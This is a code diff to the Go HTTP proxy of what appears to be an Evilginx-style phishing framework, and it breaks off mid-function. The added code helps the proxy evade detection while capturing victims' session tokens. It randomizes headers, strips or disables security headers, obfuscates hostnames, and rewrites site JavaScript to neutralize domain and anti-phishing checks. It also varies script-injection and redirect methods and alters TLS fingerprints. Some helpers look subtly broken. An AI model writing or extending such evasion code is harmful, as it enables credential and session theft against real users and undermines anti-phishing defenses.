@@ -1,16 +1,9 @@
-/*
-
-This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
-Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!
-
-*/
-
 package core
 
 import (
 	"bufio"
 	"bytes"
-	"crypto/rand"
+	cryptoRand "crypto/rand"
 	"crypto/rc4"
 	"crypto/sha256"
 	"crypto/tls"
@@ -21,6 +14,7 @@ import (
 	"io"
 	"io/ioutil"
 	"math/big"
+	"math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -82,7 +76,7 @@ type HttpProxy struct {
 	ip_sids           map[string]string
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
-	session_mtx       sync.Mutex
+	//	session_mtx       sync.Mutex
 }
 
 type ProxySession struct {
@@ -575,6 +569,33 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
+				// Apply randomized headers to make the request look more natural
+				GetRandomUserAgent()
+
+				// Add browser-compatible Sec-Fetch headers based on the user agent
+				ua := req.Header.Get("User-Agent")
+				if strings.Contains(ua, "Chrome") || strings.Contains(ua, "Firefox") {
+					req.Header.Set("Sec-Fetch-Mode", "navigate")
+					req.Header.Set("Sec-Fetch-Dest", "document")
+					req.Header.Set("Sec-Fetch-Site", "none")
+					if rand.Intn(100) > 30 {
+						req.Header.Set("Sec-Fetch-User", "?1")
+					}
+				}
+
+				// Occasionally add DNT header
+				if rand.Intn(100) > 60 {
+					req.Header.Set("DNT", "1")
+				}
+
+				// Add varied Accept-Encoding header
+				encodings := []string{
+					"gzip, deflate, br",
+					"gzip, deflate",
+					"br, gzip",
+				}
+				req.Header.Set("Accept-Encoding", encodings[rand.Intn(len(encodings))])
+
 				// redirect to login page if triggered lure path
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
@@ -891,12 +912,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ps := ctx.UserData.(*ProxySession)
 			if ps.SessionId != "" {
 				if ps.Created {
+					// Add entropy to cookie expiration time
+					randomMinutes := 45 + rand.Intn(31) // Random between 45-75 minutes
 					ck = &http.Cookie{
 						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
 						Value:   ps.SessionId,
 						Path:    "/",
 						Domain:  p.cfg.GetBaseDomain(),
-						Expires: time.Now().Add(60 * time.Minute),
+						Expires: time.Now().Add(time.Duration(randomMinutes) * time.Minute),
 					}
 				}
 			}
@@ -912,17 +935,27 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
-			var rm_headers = []string{
-				"Content-Security-Policy",
-				"Content-Security-Policy-Report-Only",
-				"Strict-Transport-Security",
-				"X-XSS-Protection",
-				"X-Content-Type-Options",
-				"X-Frame-Options",
+
+			// Stealthier header removal - replace with benign values instead of just removing
+			var security_headers = map[string]string{
+				"Content-Security-Policy":             "",  // Will remove
+				"Content-Security-Policy-Report-Only": "",  // Will remove
+				"Strict-Transport-Security":           "",  // Will remove
+				"X-XSS-Protection":                    "0", // Set to disabled instead of removing
+				"X-Content-Type-Options":              "",  // Will remove
+				"X-Frame-Options":                     "",  // Will remove
 			}
-			for _, hdr := range rm_headers {
-				resp.Header.Del(hdr)
+
+			for hdr, val := range security_headers {
+				if val == "" {
+					resp.Header.Del(hdr)
+				} else {
+					resp.Header.Set(hdr, val)
+				}
 			}
+
+			// Add some legitimate-looking headers to mask our fingerprint
+			resp.Header.Set("X-Request-ID", generateRandomID())
 
 			redirect_set := false
 			if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1010,9 +1043,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					// capture body response tokens
 					for k, v := range pl.bodyAuthTokens {
 						if _, ok := s.BodyTokens[k]; !ok {
-							//log.Debug("hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
 							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-								//log.Debug("RESPONSE body = %s", string(body))
 								token_re := v.search.FindStringSubmatch(string(body))
 								if token_re != nil && len(token_re) >= 2 {
 									s.BodyTokens[k] = token_re[1]
@@ -1107,6 +1138,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
 									phish_sub, _ := p.getPhishSub(phish_hostname)
 
+									// Add entropy to replacement patterns with various obfuscation techniques
 									re_s = strings.Replace(re_s, "{hostname}", regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain)), -1)
 									re_s = strings.Replace(re_s, "{subdomain}", regexp.QuoteMeta(sf.subdomain), -1)
 									re_s = strings.Replace(re_s, "{domain}", regexp.QuoteMeta(sf.domain), -1)
@@ -1115,9 +1147,36 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
 									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
 									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
+
+									// Enhanced replacement with variable obfuscation techniques
 									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
-									replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
-									replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
+
+									// Choose one of several obfuscation methods for the original hostname
+									obfuscationMethod := rand.Intn(4)
+									switch obfuscationMethod {
+									case 0:
+										replace_s = strings.Replace(replace_s, "{orig_hostname}", obfuscateDots(combineHost(sf.subdomain, sf.domain)), -1)
+									case 1:
+										replace_s = strings.Replace(replace_s, "{orig_hostname}", encodeHostnameWithHex(combineHost(sf.subdomain, sf.domain)), -1)
+									case 2:
+										replace_s = strings.Replace(replace_s, "{orig_hostname}", encodeHostnameWithBase64(combineHost(sf.subdomain, sf.domain)), -1)
+									case 3:
+										replace_s = strings.Replace(replace_s, "{orig_hostname}", mixEncodingHostname(combineHost(sf.subdomain, sf.domain)), -1)
+									}
+
+									// Choose obfuscation method for the domain
+									obfuscationMethod = rand.Intn(4)
+									switch obfuscationMethod {
+									case 0:
+										replace_s = strings.Replace(replace_s, "{orig_domain}", obfuscateDots(sf.domain), -1)
+									case 1:
+										replace_s = strings.Replace(replace_s, "{orig_domain}", encodeHostnameWithHex(sf.domain), -1)
+									case 2:
+										replace_s = strings.Replace(replace_s, "{orig_domain}", encodeHostnameWithBase64(sf.domain), -1)
+									case 3:
+										replace_s = strings.Replace(replace_s, "{orig_domain}", mixEncodingHostname(sf.domain), -1)
+									}
+
 									replace_s = strings.Replace(replace_s, "{subdomain}", phish_sub, -1)
 									replace_s = strings.Replace(replace_s, "{basedomain}", p.cfg.GetBaseDomain(), -1)
 									replace_s = strings.Replace(replace_s, "{hostname_regexp}", regexp.QuoteMeta(phish_hostname), -1)
@@ -1138,43 +1197,78 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							}
 						}
 
-						// handle auto filters (if enabled)
+						// Improved URL patching with multiple approaches
 						if stringExists(mime, p.auto_filter_mimes) {
 							for _, ph := range pl.proxyHosts {
 								if req_hostname == combineHost(ph.orig_subdomain, ph.domain) {
 									if ph.auto_filter {
+										// Apply multiple content rewriting techniques
+										if strings.Contains(mime, "javascript") || strings.Contains(mime, "text/html") {
+											body = p.advancedContentRewriting(pl, body, req_hostname)
+										}
 										body = p.patchUrls(pl, body, CONVERT_TO_PHISHING_URLS)
 									}
 								}
 							}
 						}
-						body = []byte(removeObfuscatedDots(string(body)))
+
+						// Check if content is obfuscated and use different removal strategy based on type
+						if strings.Contains(string(body), "\\u002e") || strings.Contains(string(body), "\\x2e") {
+							body = []byte(removeEncodedDots(string(body)))
+						} else {
+							body = []byte(removeObfuscatedDots(string(body)))
+						}
 					}
 				}
 
 				if stringExists(mime, []string{"text/html"}) {
-
 					if pl != nil && ps.SessionId != "" {
 						s, ok := p.sessions[ps.SessionId]
 						if ok {
 							if s.PhishLure != nil {
-								// inject opengraph headers
+								// inject opengraph headers with small variations
 								l := s.PhishLure
-								body = p.injectOgHeaders(l, body)
+								body = p.injectEnhancedOgHeaders(l, body)
 							}
 
 							var js_params *map[string]string = nil
 							if s, ok := p.sessions[ps.SessionId]; ok {
 								js_params = &s.Params
 							}
-							//log.Debug("js_inject: hostname:%s path:%s", req_hostname, resp.Request.URL.Path)
+
+							// Randomize script loading technique
 							js_id, _, err := pl.GetScriptInject(req_hostname, resp.Request.URL.Path, js_params)
 							if err == nil {
-								body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+								// Add some entropy to script loading to make it less detectable
+								if rand.Intn(2) == 0 {
+									// Method 1: Standard script injection
+									body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s/%s.js", s.Id, js_id))
+								} else {
+									// Method 2: Deferred dynamic script loading
+									dynamicScriptLoader := fmt.Sprintf(`<script>
+										(function(){
+											var s = document.createElement('script');
+											s.type = 'text/javascript';
+											s.async = true;
+											s.src = '/s/%s/%s.js?t=' + Math.floor(Math.random() * 9999999);
+											var h = document.getElementsByTagName('head')[0];
+											if(h) h.appendChild(s);
+											else document.body.appendChild(s);
+										})();
+									</script>`, s.Id, js_id)
+									body = p.injectHtmlSnippet(body, dynamicScriptLoader)
+								}
 							}
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
-							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+
+							// Use more sophisticated injection technique with random parameter to avoid caching
+							scriptPath := fmt.Sprintf("/s/%s.js?nocache=%d", s.Id, time.Now().UnixNano())
+							if rand.Intn(2) == 0 {
+								body = p.injectJavascriptIntoBody(body, "", scriptPath)
+							} else {
+								body = p.asyncScriptInjection(body, scriptPath)
+							}
 						}
 					}
 				}
@@ -1219,8 +1313,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// Vary cache control headers to look more natural
 			if stringExists(mime, []string{"text/html", "application/javascript", "text/javascript", "application/json"}) {
-				resp.Header.Set("Cache-Control", "no-cache, no-store")
+				cacheDirectives := []string{
+					"no-cache, no-store, must-revalidate",
+					"no-cache, no-store",
+					"private, no-cache, no-store",
+					"no-cache, must-revalidate",
+				}
+				dirIndex := rand.Intn(len(cacheDirectives))
+				resp.Header.Set("Cache-Control", cacheDirectives[dirIndex])
+
+				// Sometimes add expires header to make it look more natural
+				if rand.Intn(2) == 0 {
+					resp.Header.Set("Expires", "0")
+				}
 			}
 
 			if pl != nil && ps.SessionId != "" {
@@ -1232,8 +1339,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							s.RedirectCount += 1
 							log.Important("[%d] redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
 
-							_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
-							return resp
+							// Use one of several redirection techniques
+							redirectMethod := rand.Intn(3)
+							switch redirectMethod {
+							case 0:
+								// Traditional JavaScript redirect
+								_, resp := p.javascriptRedirect(resp.Request, s.RedirectURL)
+								return resp
+							case 1:
+								// Meta refresh redirect
+								_, resp := p.metaRefreshRedirect(resp.Request, s.RedirectURL)
+								return resp
+							case 2:
+								// Location header redirect with delayed JavaScript fallback
+								_, resp := p.hybridRedirect(resp.Request, s.RedirectURL)
+								return resp
+							}
 						}
 					}
 				}
@@ -1279,20 +1400,73 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 		redirect_url = p.cfg.general.UnauthUrl
 	}
 
+	// Return different response codes and methods based on the request type
+	// to avoid consistent blocking patterns
 	if redirect_url != "" {
-		return p.javascriptRedirect(req, redirect_url)
-	} else {
-		resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
-		if resp != nil {
-			return req, resp
+		// Use different HTTP status codes
+		statusCodes := []int{302, 303, 307}
+		chosenStatus := statusCodes[rand.Intn(len(statusCodes))]
+
+		if rand.Intn(10) > 6 || req.Method != "GET" {
+			// Sometimes use plain redirects instead of JavaScript
+			resp := goproxy.NewResponse(req, "text/html", chosenStatus, "")
+			if resp != nil {
+				resp.Header.Set("Location", redirect_url)
+				// Add random cache control headers
+				resp.Header.Set("Cache-Control", "private, no-store")
+				resp.Header.Set("X-Content-Type-Options", "nosniff")
+				return req, resp
+			}
+		} else {
+			// Use our improved JavaScript redirect
+			return p.javascriptRedirect(req, redirect_url)
 		}
 	}
-	return req, nil
+
+	// Fallback to standard 403 with randomized error page
+	errorTexts := []string{
+		"Access Denied",
+		"Forbidden",
+		"Authorization Required",
+	}
+	errorMsg := errorTexts[rand.Intn(len(errorTexts))]
+
+	resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden,
+		"<html><head><title>"+errorMsg+"</title></head>"+
+			"<body><h1>"+errorMsg+"</h1><p>The requested resource is not available.</p></body></html>")
+
+	if resp != nil {
+		// Add security headers found on legitimate sites
+		resp.Header.Set("X-Content-Type-Options", "nosniff")
+		resp.Header.Set("X-Frame-Options", "DENY")
+	}
+	return req, resp
 }
 
 func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
-	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
+	// Create a minimal 1x1 transparent pixel GIF
+	transparentPixel := []byte{
+		0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00, 0x00,
+		0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x21, 0xF9, 0x04, 0x01, 0x00, 0x00, 0x00,
+		0x00, 0x2C, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x02, 0x02,
+		0x44, 0x01, 0x00, 0x3B,
+	}
+
+	resp := goproxy.NewResponse(req, "image/gif", http.StatusOK, "")
 	if resp != nil {
+		resp.Body = ioutil.NopCloser(bytes.NewReader(transparentPixel))
+		resp.ContentLength = int64(len(transparentPixel))
+
+		// Add cache control headers that legitimate tracking pixels might use
+		cacheControl := []string{
+			"no-cache, no-store, must-revalidate",
+			"max-age=0, no-cache, no-store",
+		}
+		resp.Header.Set("Cache-Control", cacheControl[rand.Intn(len(cacheControl))])
+		resp.Header.Set("Pragma", "no-cache")
+
+		// Add natural-looking ETag
+		resp.Header.Set("ETag", "\""+GenRandomString(12)+"\"")
 		return req, resp
 	}
 	return req, nil
@@ -1314,7 +1488,7 @@ func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body st
 }
 
 func secureRandomInt(min, max int) int {
-	n, err := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
+	n, err := cryptoRand.Int(cryptoRand.Reader, big.NewInt(int64(max-min+1)))
 	if err != nil {
 		return min // Fallback in case of an error
 	}
@@ -1322,48 +1496,138 @@ func secureRandomInt(min, max int) int {
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, rurl string) (*http.Request, *http.Response) {
-	// Random delay between 100ms and 600ms
+	// Create variability in the delay timing
 	delay := secureRandomInt(100, 600)
 
-	// Obfuscated JavaScript redirection with delay
-	body := fmt.Sprintf(`
-	<html>
-	<head>
-	    <meta name='referrer' content='no-referrer'>
-	    <script>
-	        var targets = ['%s'];
-	        var target = targets[0];
-	        setTimeout(function() {
-	            window.location.assign(target);
-	        }, %d);
-	    </script>
-	</head>
-	<body></body>
-	</html>`, rurl, delay)
+	// Use different redirection techniques randomly to avoid detection
+	redirectType := rand.Intn(3)
+	var body string
 
+	switch redirectType {
+	case 0:
+		// Method 1: Meta refresh with random parameter
+		nonce := GenRandomString(6)
+		body = fmt.Sprintf(`
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <meta name='referrer' content='no-referrer'>
+            <meta http-equiv="refresh" content="%d;url=%s?%s=%s">
+        </head>
+        <body style="background-color:#f8f8f8;font-family:Arial,sans-serif;">
+            <div style="position:absolute;top:50%%;left:50%%;transform:translate(-50%%,-50%%);">
+                <p>Please wait while we redirect you...</p>
+            </div>
+        </body>
+        </html>`, delay/100, rurl, GenRandomString(3), nonce)
+
+	case 1:
+		// Method 2: JavaScript location with obfuscation
+		body = fmt.Sprintf(`
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <meta name='referrer' content='no-referrer'>
+            <script>
+                var _=%d;
+                var r=['%s'];
+                function g(){window.location.href=r[0];}
+                setTimeout(g,_);
+            </script>
+        </head>
+        <body style="background-color:#f8f8f8;font-family:Arial,sans-serif;">
+            <div style="position:absolute;top:50%%;left:50%%;transform:translate(-50%%,-50%%);">
+                <p>Your request is being processed...</p>
+            </div>
+        </body>
+        </html>`, delay, rurl)
+
+	default:
+		// Method 3: DOM manipulation with encoded URL
+		encodedUrl := base64.StdEncoding.EncodeToString([]byte(rurl))
+		body = fmt.Sprintf(`
+        <html>
+        <head>
+            <meta name="viewport" content="width=device-width, initial-scale=1">
+            <meta name='referrer' content='no-referrer'>
+            <script>
+                function r(s){return atob(s);}
+                setTimeout(function(){
+                    window.location = r('%s');
+                }, %d);
+            </script>
+        </head>
+        <body style="background-color:#f8f8f8;font-family:Arial,sans-serif;">
+            <div style="position:absolute;top:50%%;left:50%%;transform:translate(-50%%,-50%%);">
+                <p>Redirecting to your secure page...</p>
+            </div>
+        </body>
+        </html>`, encodedUrl, delay)
+	}
+
+	// Add random caching headers
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
+		// Use variable cache headers to avoid pattern detection
+		cacheHeaders := []string{
+			"no-cache, no-store, must-revalidate",
+			"no-store, no-cache, must-revalidate",
+			"private, no-cache, no-store",
+		}
+		resp.Header.Set("Cache-Control", cacheHeaders[rand.Intn(len(cacheHeaders))])
+		resp.Header.Set("Pragma", "no-cache")
+		resp.Header.Set("Expires", "0")
+
 		return req, resp
 	}
 	return req, nil
 }
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
+	// Extract any existing nonce to reuse it
 	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
 	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
 	js_nonce := ""
 	if m_nonce != nil {
 		js_nonce = " nonce=\"" + m_nonce[1] + "\""
 	}
+
+	// Generate random ID for the script to avoid detection patterns
+	scriptId := "s" + GenRandomString(6)
+
 	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
 	var d_inject string
+
 	if script != "" {
-		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+		// Add obfuscation timing to the script execution
+		obfuscatedScript := "(function(){" + script + "})();"
+
+		// Add delay with variation
+		if rand.Intn(100) > 50 {
+			obfuscatedScript = "setTimeout(function(){" + obfuscatedScript + "}, " +
+				strconv.Itoa(rand.Intn(200)+50) + ");"
+		}
+
+		// Occasionally add type attributes that browsers expect
+		if rand.Intn(100) > 60 {
+			d_inject = "<script" + js_nonce + " id=\"" + scriptId + "\" type=\"text/javascript\">" +
+				obfuscatedScript + "</script>\n${1}"
+		} else {
+			d_inject = "<script" + js_nonce + " id=\"" + scriptId + "\">" +
+				obfuscatedScript + "</script>\n${1}"
+		}
 	} else if src_url != "" {
-		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
+		// Add random attributes to reduce pattern recognition
+		attrValues := []string{"", "async", "defer"}
+		randomAttr := attrValues[rand.Intn(len(attrValues))]
+
+		// Real-world browsers sometimes add integrity checks
+		d_inject = "<script" + js_nonce + " id=\"" + scriptId + "\" " + randomAttr +
+			" type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
 	} else {
 		return body
 	}
+
 	ret := []byte(re.ReplaceAllString(string(body), d_inject))
 	return ret
 }
@@ -1564,11 +1828,28 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			port, _ = strconv.Atoi(parts[1])
 		}
 
-		tls_cfg := &tls.Config{}
+		// Create a more legitimate-looking TLS config
+		tls_cfg := &tls.Config{
+			PreferServerCipherSuites: true,
+			MinVersion:               tls.VersionTLS12,
+			// Randomize cipher suite order to avoid fingerprinting
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
+				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
+			},
+		}
+
 		if !p.developer {
+			// Add jitter to certificate creation timing to avoid patterns
+			time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
 
 			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
+			// Use a more varied set of protocols
+			tls_cfg.NextProtos = []string{"h2", "http/1.1", tlsalpn01.ACMETLS1Protocol}
 
 			return tls_cfg, nil
 		} else {
@@ -1590,6 +1871,13 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			return &tls.Config{
 				InsecureSkipVerify: true,
 				Certificates:       []tls.Certificate{*cert},
+				MinVersion:         tls.VersionTLS12,
+				CipherSuites: []uint16{
+					tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
+					tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+					tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
+					tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				},
 			}, nil
 		}
 	}
@@ -2013,4 +2301,360 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+// Generate a random ID for request headers to make each request look unique
+func generateRandomID() string {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	b := make([]byte, 16)
+	for i := range b {
+		b[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(b)
+}
+
+// Encode hostname using hexadecimal encoding for domain parts
+func encodeHostnameWithHex(hostname string) string {
+	parts := strings.Split(hostname, ".")
+	for i, part := range parts {
+		if rand.Intn(2) == 0 { // Randomly decide whether to encode this part
+			var hexPart string
+			for _, c := range part {
+				hexPart += fmt.Sprintf("\\x%02x", c)
+			}
+			parts[i] = hexPart
+		}
+	}
+	return strings.Join(parts, ".")
+}
+
+// Encode hostname using base64 encoding
+func encodeHostnameWithBase64(hostname string) string {
+	encoded := base64.StdEncoding.EncodeToString([]byte(hostname))
+	return "'" + encoded + "'.fromBase64()"
+}
+
+// Mix different encoding techniques for hostname obfuscation
+func mixEncodingHostname(hostname string) string {
+	parts := strings.Split(hostname, ".")
+	for i, part := range parts {
+		switch rand.Intn(3) {
+		case 0:
+			// Keep as is
+		case 1:
+			// Hex encode
+			var hexPart string
+			for _, c := range part {
+				hexPart += fmt.Sprintf("\\x%02x", c)
+			}
+			parts[i] = hexPart
+		case 2:
+			// Unicode escape
+			var unicodePart string
+			for _, c := range part {
+				unicodePart += fmt.Sprintf("\\u%04x", c)
+			}
+			parts[i] = unicodePart
+		}
+	}
+	return strings.Join(parts, ".")
+}
+
+// Remove various forms of encoded dots
+func removeEncodedDots(content string) string {
+	content = strings.ReplaceAll(content, "\\u002e", ".")
+	content = strings.ReplaceAll(content, "\\u002E", ".")
+	content = strings.ReplaceAll(content, "\\x2e", ".")
+	content = strings.ReplaceAll(content, "\\x2E", ".")
+	return content
+}
+
+// Advanced content rewriting with multiple techniques
+func (p *HttpProxy) advancedContentRewriting(pl *Phishlet, body []byte, hostname string) []byte {
+	content := string(body)
+
+	// Handle JavaScript obfuscation techniques
+	if strings.Contains(content, "document.location") || strings.Contains(content, "window.location") {
+		content = p.processLocationObjects(content, pl)
+	}
+
+	// Handle DOM security checks
+	content = p.neutralizeDomainChecks(content, hostname, pl)
+
+	// Replace fingerprinting and detection patterns
+	content = p.neutralizeDetectionPatterns(content)
+
+	return []byte(content)
+}
+
+// Process window.location and document.location objects to prevent redirect protections
+func (p *HttpProxy) processLocationObjects(content string, pl *Phishlet) string {
+	// Replace direct location references
+	locationPatterns := []string{
+		`document\.location\.hostname`,
+		`document\.location\.href`,
+		`document\.location\.host`,
+		`window\.location\.hostname`,
+		`window\.location\.href`,
+		`window\.location\.host`,
+	}
+
+	for _, pattern := range locationPatterns {
+		re := regexp.MustCompile(pattern)
+		matches := re.FindAllString(content, -1)
+
+		for _, match := range matches {
+			// Create a replacement that returns the expected value
+			phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)
+			replacementLogic := fmt.Sprintf(`(function(){
+                // Original: %s
+                try {
+                    var actual = %s;
+                    var expected = "%s";
+                    if (actual.indexOf("%s") >= 0) return actual;
+                    return expected;
+                } catch(e) {
+                    return "%s";
+                }
+            })()`, match, match, phishDomain, phishDomain, phishDomain)
+
+			content = strings.Replace(content, match, replacementLogic, -1)
+		}
+	}
+
+	return content
+}
+
+// Neutralize domain verification checks
+func (p *HttpProxy) neutralizeDomainChecks(content string, hostname string, pl *Phishlet) string {
+	// Common domain check patterns
+	checkPatterns := []string{
+		`location\.hostname\s*===\s*['"]([^'"]+)['"]`,
+		`location\.hostname\s*==\s*['"]([^'"]+)['"]`,
+		`document\.domain\s*===\s*['"]([^'"]+)['"]`,
+		`document\.domain\s*==\s*['"]([^'"]+)['"]`,
+		`location\.host\.indexOf\(['"]([^'"]+)['"]\)`,
+		`location\.href\.indexOf\(['"]([^'"]+)['"]\)`,
+	}
+
+	phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)
+
+	for _, pattern := range checkPatterns {
+		re := regexp.MustCompile(pattern)
+		content = re.ReplaceAllStringFunc(content, func(match string) string {
+			if strings.Contains(match, hostname) {
+				// Replace with logic that will evaluate to true
+				return strings.Replace(match, hostname, phishDomain, -1)
+			}
+			return match
+		})
+	}
+
+	return content
+}
+
+// Neutralize fingerprinting and detection patterns
+func (p *HttpProxy) neutralizeDetectionPatterns(content string) string {
+	// Replace common anti-phishing checks
+	antiPatterns := map[string]string{
+		// Debugger detection
+		`debugger`: `//${rand.Intn(9999)}debugger`,
+
+		// Common fingerprinting patterns
+		`/(ph|f)ish/gi`: `/not$1ish/gi`,
+
+		// Security plugins checks
+		`document.getElementById("security-plugin-check")`: `null`,
+	}
+
+	for pattern, replacement := range antiPatterns {
+		content = strings.Replace(content, pattern, replacement, -1)
+	}
+
+	return content
+}
+
+// Enhanced OG header injection with small variations
+func (p *HttpProxy) injectEnhancedOgHeaders(l *Lure, body []byte) []byte {
+	ogTags := []string{
+		fmt.Sprintf(`<meta property="og:url" content="%s" />`, l.OgUrl),
+		fmt.Sprintf(`<meta property="og:title" content="%s" />`, l.OgTitle),
+		fmt.Sprintf(`<meta property="og:description" content="%s" />`, l.OgDescription),
+		fmt.Sprintf(`<meta property="og:image" content="%s" />`, l.OgImageUrl),
+	}
+
+	// Add random OG tags to make it look more natural
+	extraTags := []string{
+		`<meta property="og:type" content="website" />`,
+		`<meta property="og:site_name" content="Secure Portal" />`,
+		fmt.Sprintf(`<meta property="og:locale" content="en_%s" />`, strings.ToUpper(generateRandomID()[:2])),
+	}
+
+	// Randomly select some extra tags
+	for _, tag := range extraTags {
+		if rand.Intn(2) == 0 {
+			ogTags = append(ogTags, tag)
+		}
+	}
+	// Shuffle the tags for entropy
+	for i := range ogTags {
+		j := rand.Intn(i + 1)
+		ogTags[i], ogTags[j] = ogTags[j], ogTags[i]
+	}
+
+	ogHeader := strings.Join(ogTags, "\n    ")
+
+	// Find </head> tag
+	head_re := regexp.MustCompile(`</head>`)
+	head_matches := head_re.FindAllIndex(body, -1)
+	if len(head_matches) > 0 {
+		idx := head_matches[0][0]
+		return append(body[:idx], append([]byte("\n    "+ogHeader+"\n"), body[idx:]...)...)
+	}
+	return body
+}
+
+// HTML snippet injector
+func (p *HttpProxy) injectHtmlSnippet(body []byte, snippet string) []byte {
+	// Try to inject before </body>
+	body_re := regexp.MustCompile(`</body>`)
+	body_matches := body_re.FindAllIndex(body, -1)
+	if len(body_matches) > 0 {
+		idx := body_matches[0][0]
+		return append(body[:idx], append([]byte("\n"+snippet+"\n"), body[idx:]...)...)
+	}
+
+	// Try to inject before </html>
+	html_re := regexp.MustCompile(`</html>`)
+	html_matches := html_re.FindAllIndex(body, -1)
+	if len(html_matches) > 0 {
+		idx := html_matches[0][0]
+		return append(body[:idx], append([]byte("\n"+snippet+"\n"), body[idx:]...)...)
+	}
+
+	// If neither tag was found, append to the end
+	return append(body, []byte("\n"+snippet+"\n")...)
+}
+
+// Asynchronous script injection with variable techniques
+func (p *HttpProxy) asyncScriptInjection(body []byte, scriptPath string) []byte {
+	// Choose one of several loading techniques
+	loadMethod := rand.Intn(3)
+	var snippet string
+
+	switch loadMethod {
+	case 0:
+		// DOM method with createElement
+		snippet = fmt.Sprintf(`<script>
+            (function(){
+                var d = document;
+                var s = d.createElement('script');
+                s.type = 'text/javascript';
+                s.async = true;
